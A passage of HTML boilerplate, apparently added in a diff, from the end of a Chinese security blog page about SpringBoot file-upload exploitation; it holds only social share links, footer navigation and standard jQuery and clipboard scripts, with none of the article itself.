+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/&title=SpringBoot下的文件上传利用"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/&is_video=false&description=SpringBoot下的文件上传利用"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SpringBoot下的文件上传利用&body=Check out this article: http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/&title=SpringBoot下的文件上传利用"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/&title=SpringBoot下的文件上传利用"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/&title=SpringBoot下的文件上传利用"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/&title=SpringBoot下的文件上传利用"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/&name=SpringBoot下的文件上传利用&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/&t=SpringBoot下的文件上传利用"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    yy
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/yaoyao-cool">项目</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
